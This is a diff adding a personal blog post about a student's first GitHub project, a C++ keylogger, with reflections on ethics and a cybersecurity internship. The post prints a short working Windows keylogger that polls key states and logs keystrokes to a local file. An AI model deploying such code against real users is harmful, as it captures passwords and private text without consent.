@@ -1,0 +1,52 @@
+---
+title: "My First Project on Github- keylogger"
+publishedAt: "2023-03-05"
+summary: "First project to Github and the lessons learned along the way."
+---
+
+## My First Project and Why I Pushed it to Github
+
+During my third year of college, I created a keylogger project using C++ which gave me curiosity and introduced me to the world of hacking. This project was my first time working on a real project using coding. However, after completing the project, I was faced with the dilemma of whether to make it open source or not. I was afraid that the tool could be used for malicious purposes, which made me hesitant to share it with others. After considering the ethical implications of developing such a tool and my desire to share my work with the world, I ultimately decided to push my project to Github.
+
+## From Coding Curiosity to Cybersecurity Internship
+
+My Journey So Far As someone who was never interested in coding before, my keylogger project sparked my curiosity and led me to learn more about cybersecurity. I ended up doing an internship at Gurgaon Police on cyber security, where I met so many cool people and learned a lot about the industry. This experience was invaluable and taught me the importance of ethical hacking and the real-world impact of cybercrime.
+
+## Developing a Tool with Ethical Implications
+
+How I Overcame My Concerns When developing the keylogger project, I was acutely aware of the ethical implications of creating a tool that could be used for malicious purposes. I was hesitant to share it with others, worried about the possible consequences. However, after thinking about the potential benefits of open sourcing my project, such as improving the security of online systems, I decided to push it to Github.
+
+### Here's a glimpse of the important code used in the keylogger project:
+
+```c++
+#include <iostream>
+#include <Windows.h>
+#include <fstream>
+
+using namespace std;
+
+void log() {
+    char c;
+    for (;;) {
+        for (c = 8; c < 190; c++) {
+            if (GetAsyncKeyState(c) == -32767) {
+                ofstream write("newlog.txt", ios::app);
+                write << c;
+                write.close();
+            }
+        }
+    }
+}
+
+int main() {
+    log();
+    return 0;
+}
+
+```
+
+This code contains the log() function that captures keystrokes using a loop, and writes them to a text file called "newlog.txt". The main() function simply calls the log() function to start the keylogging process.
+
+## Pushing My Project to Github
+
+Pushing my project to Github was a new experience for me. After creating an account and navigating the user interface, I uploaded my code to a public repository on Github (https://github.com/nhemnt/keylogger). At first, I didn't expect much attention, but I hoped that it might help other beginners to learn about keyloggers and understand the importance of cyber security.
